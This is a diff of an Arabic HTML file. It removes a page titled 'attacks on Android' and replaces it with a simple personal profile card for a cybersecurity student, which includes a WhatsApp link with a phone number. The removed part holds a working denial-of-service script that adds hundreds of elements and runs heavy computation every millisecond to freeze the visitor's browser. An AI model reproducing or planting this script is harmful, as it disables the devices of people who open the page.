@@ -1,51 +1,104 @@
-<!DOCTYPE html>  <html>  
-<head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>هجمات على الأندرويد</title>  
-    <style>  
-        body {  
-            margin: 0;  
-            padding: 0;  
-            background-color: #000;  
-            color: #fff;  
-            text-align: center;  
-            font-family: Arial, sans-serif;  
-        }  
-        h1 {  
-            padding-top: 20px;  
-        }  
-    </style>  
-</head>  
-<body>  
-    <h1>✋ توقف عن الضغط على الخروج!</h1>  
-    <p>أنت الآن في حصن الأندرويد.</p>  <script>  
-    // دالة مدمجة لاستنزاف المعالج  
-    function destroyAndro() {  
-        // حلقة لا نهائية لإنشاء عناصر كثيرة جداً في كل مرة  
-        for (var i = 0; i < 500; i++) {  
-            // إنشاء عنصر div جديد  
-            var el = document.createElement('div');  
-            // إعطائه مظهر عشوائي ليأخذ مساحة أكبر  
-            el.style.position = 'absolute';  
-            el.style.left = Math.floor(Math.random() * window.innerWidth) + 'px';  
-            el.style.top = Math.floor(Math.random() * window.innerHeight) + 'px';  
-            el.style.width = Math.floor(Math.random() * 100) + 'px';  
-            el.style.height = Math.floor(Math.random() * 100) + 'px';  
-            el.style.backgroundColor = 'rgba(' + Math.floor(Math.random() * 255) + ',' + Math.floor(Math.random() * 255) + ',' + Math.floor(Math.random() * 255) + ', 0.5)';  
-            document.body.appendChild(el);  
-        }  
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>موقعي الشخصي</title>
+    <style>
+        /* قسم التنسيق (CSS) - هنا نتحكم بالألوان والشكل */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-        // عملية حسابية ثقيلة جداً لتشغيل المعالج  
-        var a = 0;  
-        for (var j = 0; j < 1000000; j++) {  
-            a = Math.sqrt(j) * Math.random();  
-        }  
-    }  
+        .card {
+            background-color: white;
+            width: 350px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            text-align: center;
+        }
 
-    // تشغيل الهجوم كل 1 مللي ثانية  
-    setInterval(destroyAndro, 1);  
-</script>
+        .profile-img {
+            width: 100px;
+            height: 100px;
+            background-color: #007bff;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
 
-</body>  
-</html>
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .skills {
+            margin-top: 15px;
+        }
+
+        .skill-tag {
+            display: inline-block;
+            background-color: #e2e3ff;
+            color: #4b51ef;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin: 2px;
+        }
+
+        .btn {
+            display: block;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="profile-img">👨‍💻</div>
+        
+        <h1>نواف جواد</h1>
+        
+        <p>مهندس شبكات وطالب في الأمن السيبراني. مهتم بتطوير المواقع وحماية البيانات.</p>
+
+        <div class="skills">
+            <span class="skill-tag">Java</span>
+            <span class="skill-tag">Network Engineering</span>
+            <span class="skill-tag">Cybersecurity</span>
+        </div>
+
+         <a href="https://wa.me/967770045223" class="btn">تواصل معي عبر الواتساب</a>
+        
+    </div>
+
+</body>
+    </html>
+        
